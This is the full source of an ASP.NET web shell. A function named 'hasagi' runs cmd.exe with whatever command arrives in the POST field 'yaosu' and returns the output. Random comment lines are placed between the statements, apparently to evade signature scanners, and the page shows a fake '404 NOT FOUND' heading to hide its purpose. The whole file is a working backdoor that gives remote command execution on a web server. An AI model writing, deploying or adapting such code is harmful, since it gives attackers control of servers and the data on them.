<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string hasagi(string arg)
{
<%--a0goaigj sdfiopdsjfipoe023809ru3209r932u8r0329ur32uj0--%>
ProcessStartInfo psi = new ProcessStartInfo();
<%--a0dwf23894u90jfdspfj cnds8fyds89fh dsp8f9 sd89fywe982u8r0329ur32uj0--%>
psi.FileName = "cmd.exe";
<%--a-w=rodpskd-s0fi9-032irf32iker-023i09edsi320ier09uif90u3409fu09--%>
psi.Arguments = "/c "+arg;
<%--a0goaigj sdfiopdsjfipoe023809ru3209r932u8r0329ur32uj0--%>
psi.RedirectStandardOutput = true;
<%--930rew90r3u09dfj sn0fur093029f ds09fhe3 r32hf 32809ryhf3892hy98--%>
psi.UseShellExecute = false;
<%--agopjsipofjweifj iewohfidsofc sdpio32-r432=-resjfiojoi--%>
Process p = Process.Start(psi);
<%--sogjsdpfj sdfjs rf23io cio32 e3io2 32iorh3e0orh893h3289r h9e82hf89e2 hf89h3e89--%>
StreamReader stmrdr = p.StandardOutput;
<%--fsdiofh sdoifhewiorh 3280ry3289ryc 3289 wes;afchsa;cnaspioijxcsaio;;hdcoisah--%>
string s = stmrdr.ReadToEnd();
<%--agksdhf o2io247wuoip dsncsadi9y fvw89qesfihwq09efjs0-fsx-0vsdfiohoi--%>
stmrdr.Close();
<%--idohf23902r03820r9iu disdh9wqyhdr89w qc98weyr2389yr983--%>
return s;
<%--9430u8320920 cr3209yr32 80903 c0ryhe80 re89rf 9237hf7832grf87g3287--%>
}
void Runn(object sender, System.EventArgs e)
{
if(Request.Form["yaosu"] != null){
Response.Write("<pre>");
<%--ofsdipjf0u029ur83wreu 9328rey32897ryw8e dsadcsajdpojsa0fhsai8fhqahfgqoahgf0oi--%>
Response.Write(Server.HtmlEncode(hasagi(Request.Form["yaosu"])));
<%--e2r09e2 0r2ur-2390rwe-=drs=fdiwejh crf98hu8sdhfuigsau7fgsau7fgiusagfui--%>
Response.Write("</pre>");}
}
</script>
<HTML>
<HEAD>
<title>hasagi</title>
</HEAD>
<body onload="Runn" runat="server">
<h1>404 NOT FOUND !</h1>
</body>
</HTML>